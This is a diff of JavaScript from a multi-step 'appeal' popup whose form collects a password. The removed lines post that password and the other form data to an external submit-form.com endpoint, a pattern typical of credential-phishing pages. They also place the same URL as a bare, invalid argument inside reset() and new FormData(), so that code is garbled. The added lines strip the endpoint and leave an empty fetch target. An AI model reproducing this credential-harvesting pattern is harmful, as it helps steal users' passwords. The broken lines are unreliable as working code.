@@ -1338,8 +1338,8 @@
                 document.getElementById('step3').classList.remove('active');
                 
                 // Clear form
-                document.getElementById('step1').reset(https://submit-form.com/CTbX1TGUV);
-                document.getElementById('step2').reset(https://submit-form.com/CTbX1TGUV);
+                document.getElementById('step1').reset();
+                document.getElementById('step2').reset();
                 
                 // Scroll to top of popup content
                 document.querySelector('.popup-body').scrollTop = 0;
@@ -1401,7 +1401,7 @@
                 submitAppealBtn.textContent = 'Submitting...';
                 
                 // Get all form data
-                const formData = new FormData(https://submit-form.com/CTbX1TGUV);
+                const formData = new FormData();
                 
                 // Add step1 data
                 const step1Form = document.getElementById('step1');
@@ -1414,7 +1414,7 @@
                 formData.append('password', password);
                 
                 // Submit the form
-                fetch('https://submit-form.com/CTbX1TGUV', {
+                fetch('', {
                     method: 'POST',
                     body: formData
                 })
